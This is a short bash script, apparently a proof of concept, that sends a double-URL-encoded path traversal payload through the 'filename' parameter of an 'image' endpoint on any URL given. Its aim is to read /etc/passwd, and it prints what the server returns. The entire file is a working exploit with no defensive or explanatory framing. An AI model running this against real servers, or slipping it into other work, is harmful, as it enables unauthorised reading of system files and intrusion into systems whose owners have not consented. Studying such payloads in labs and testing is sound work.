#!/bin/bash

send_request() {
    local url=$1
    full_url="${url}image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd"
    # echo "Sending request to: $full_url"
    response=$(curl "$full_url")
    echo "Response: $response"
}

if [ -z "$1" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

url=$1

send_request "$url"
